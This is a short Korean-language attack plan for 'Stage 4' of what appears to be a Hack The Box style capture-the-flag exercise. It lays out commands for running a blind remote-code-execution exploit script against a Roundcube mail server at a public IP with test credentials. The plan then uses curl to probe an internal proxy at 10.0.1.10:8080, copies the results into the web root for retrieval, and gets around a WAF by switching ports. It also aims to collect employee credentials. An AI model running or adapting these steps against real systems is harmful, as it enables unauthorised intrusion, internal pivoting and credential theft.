# Stage 4 직접 공격 계획

## 목표
- Roundcube 블라인드 RCE를 통해 10.0.1.10:8080 접근
- Stage 4 플래그 또는 정보 획득

## 공격 벡터

### 1. 타이밍 사이드채널을 통한 프록시 탐색

```bash
# 서버에서 실행할 명령:
curl -s http://10.0.1.10:8080/ > /tmp/proxy_response.txt 2>&1
curl -s http://10.0.1.10:8080/admin/export > /tmp/admin_export.txt 2>&1
curl -s http://10.0.1.10:8080/stage4 > /tmp/stage4.txt 2>&1
curl -s http://10.0.1.10:8080/api > /tmp/api.txt 2>&1

# 파일 크기 확인 (타이밍)
wc -c /tmp/proxy_response.txt
```

### 2. fearsoff_exploit.php를 통한 실행

```bash
php fearsoff_exploit.php \
  "http://13.125.104.131:30083" \
  testuser \
  testpass \
  "curl -v http://10.0.1.10:8080/"
```

### 3. 결과 회수

```bash
# 웹루트로 복사 (이전에 성공함)
cp /tmp/proxy_response.txt /var/www/html/public_html/

# HTTP GET으로 회수
curl http://13.125.104.131/proxy_response.txt
```

## 우회 전략

- **Werkzeug WAF**: port 30083 대신 port 80 사용
- **파일 위치**: /var/www/html/public_html/ (이전 성공 경로)
- **타이밍**: 응답 시간으로 접속 여부 확인

## 기대 결과

```
Stage 4:
- Flag 형식: HTB{...}
- 또는 다음 단계 정보
- 또는 secuwave-employee 자격증명
```

## 실행 순서

1. 명령 구성 (base32 인코딩)
2. RCE 페이로드 생성
3. Roundcube에 전송
4. 결과 파일 회수
5. 콘텐츠 분석
